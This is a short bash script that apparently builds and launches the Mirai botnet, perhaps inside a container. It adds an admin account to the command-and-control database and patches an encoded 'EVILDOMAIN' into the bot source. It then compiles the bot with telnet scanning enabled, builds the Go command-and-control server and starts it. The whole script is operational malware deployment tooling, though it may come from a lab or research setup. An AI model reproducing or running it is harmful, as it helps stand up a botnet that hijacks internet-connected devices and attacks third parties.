#!/usr/bin/env bash

echo "INSERT INTO users VALUES (NULL, '$MIRAI_ADMIN_USERNAME', '$MIRAI_ADMIN_PASSWORD', 0, 0, 0, 0, -1, 1, 30, '');" \
>> source/db.sql

myenc string $EVILDOMAIN | sed 's/\\/\\\\/g' > test.txt\
      && export EVILDOMAIN_HEX=`cat test.txt` \
      && sed -i "s/insert_here/$EVILDOMAIN_HEX/g" source/bot/table.c \
      && rm test.txt

until mysql -h$MYSQL_HOST -uroot -p$MYSQL_PASSWORD < source/db.sql; do
  >&2 echo "Mysql is unavailable - sleeping"
  sleep 1
done

>&2 echo "Mysql is up - executing command"

gcc -std=c99 source/bot/*.c -DDEBUG "-DMIRAI_TELNET" \
                        -static -g -o /root/mirai.dbg \
    && echo "gcc compile done" \
    && go build -o /root/cnc source/cnc/*.go \
    && echo "go compile done" \
    && mv source/prompt.txt /root && rm -rf source \
    && echo "clean done" && ls \
    && cp mirai.dbg share/ && ./cnc
